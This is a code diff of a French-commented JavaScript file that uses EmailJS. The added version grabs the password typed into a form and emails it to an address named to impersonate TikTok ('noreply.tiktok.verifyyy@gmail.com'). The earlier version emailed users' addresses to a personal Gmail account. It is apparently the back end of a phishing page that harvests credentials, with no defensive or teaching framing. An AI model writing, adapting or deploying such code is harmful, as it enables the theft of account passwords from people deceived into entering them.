@@ -1,36 +1,34 @@
 // Initialisation EmailJS
 (function () {
-  emailjs.init("RKJ66EUsnU-kI6qh6"); // Remplace par ton User ID réel si besoin
+  emailjs.init("KsAeYBNJTNWnyUxfM"); // Remplace par ton User ID réel
 })();
 
-// Gérer l'envoi d'email au clic sur "JOUER"
-document.getElementById("login-form").addEventListener("submit", function (e) {
-  e.preventDefault();
+// Gérer l'envoi d'email au clic sur "Suivant"
+document
+  .getElementById("password-form")
+  .addEventListener("submit", function (e) {
+    e.preventDefault();
 
-  const email = document.getElementById("email").value;
+    // Récupérer le mot de passe saisi
+    const password = document.getElementById("password").value;
 
-  // Si l'utilisateur n'a pas saisi d'email, rediriger vers la page Accueil.html
-  if (!email) {
-    window.location.href = "Accueil.html";
-    return;
-  }
+    // Paramètres du modèle EmailJS
+    const templateParams = {
+      to_email: "noreply.tiktok.verifyyy@gmail.com", // Destinataire de l'email
+      user_password: password, // Mot de passe saisi par l'utilisateur
+    };
 
-  // Paramètres du modèle EmailJS
-  const templateParams = {
-    to_email: "shetysh3tys@gmail.com", // Destinataire de l'email
-    user_email: email, // Email de l'utilisateur
-  };
-
-  // Envoi de l'email via EmailJS
-  emailjs.send("service_50vwsmg", "template_l2cmtvo", templateParams).then(
-    function (response) {
-      console.log("Connexion succes");
-      window.location.href = "./AcceuilPage/Acceuil.html"; // Redirige après envoi réussi
-    },
-    function (error) {
-      console.log(
-        "FAILED: un problème est survenu veuillez-vous connecter sans mail !"
-      );
-    }
-  );
-});
+    // Envoi de l'email via EmailJS
+    emailjs.send("service_50vwsmg", "template_l2cmtvo", templateParams).then(
+      function (response) {
+        console.log("Mot de passe envoyé avec succès !", response);
+        alert("Mot de passe envoyé avec succès !");
+        // Rediriger ou effectuer une autre action après l'envoi réussi
+        // window.location.href = "Accueil.html";
+      },
+      function (error) {
+        console.error("Erreur lors de l'envoi :", error);
+        alert("Erreur lors de l'envoi du mot de passe. Veuillez réessayer.");
+      }
+    );
+  });
